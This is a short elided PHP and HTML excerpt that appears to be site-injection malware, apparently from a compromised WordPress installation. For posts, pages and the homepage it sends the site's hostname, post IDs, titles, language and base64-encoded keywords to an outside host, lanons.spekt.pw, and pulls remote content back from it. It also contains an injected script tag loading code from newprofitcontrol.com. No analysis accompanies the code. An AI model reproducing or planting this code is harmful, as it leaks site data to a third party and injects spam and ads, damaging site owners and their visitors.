...
if ($ptype == 'post' || $ptype == 'page' || $ptype == 'homepage')
	...
	$spekturl = "http://lanons.spekt.pw/xx.php?i=" . $protocol . $_SERVER['HTTP_HOST'] . "&p=" . $postid1 . "&t=" . $ptype . "&title=" . $ptitle . "&lang=" . $plang . "&dnetname=" . $dnetname;
...
if (preg_match_all('/<search>([\s\S]*?)<\/search>/i', $linkcontent, $matchsearch))
	...
	if ($foundkeywords !== '')
		{
		$linkcontentx = @file_get_contents("http://lanons.spekt.pw/xx.php?i=" . $protocol . $_SERVER['HTTP_HOST'] . "&p=" . $postid1 . "&t=" . $ptype . "&title=" . $ptitle . "&lang=" . $plang . "&k=" . base64_encode($foundkeywords) . "&dnetname=" . $dnetname);
		}
	}
...
<script type="text/javascript" src="//newprofitcontrol.com/apu.php?zoneid=1534521"></script>
